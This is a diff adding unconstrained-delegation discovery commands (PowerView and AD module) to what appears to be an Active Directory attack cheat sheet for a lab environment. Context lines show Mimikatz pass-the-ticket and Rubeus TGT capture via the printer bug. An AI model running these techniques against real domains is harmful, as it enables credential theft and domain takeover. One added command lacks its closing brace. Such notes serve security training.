@@ -256,6 +256,18 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2c
 
 # **Unconstrained Delegation - Printer Bug**
 
+- Discover domain computers which have unconstrained delegation enabled :
+
+
+```powershell
+# Powerview
+Get-DomainComputer -UnConstrained
+
+# AD Module
+Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+Get-ADUser -Filter {TrustedForDelegation -eq $True
+```
+
 
 
 - We can capture the TGT of dcorp-dc$ by using `Rubeus` on **dcorp-appsrv**:
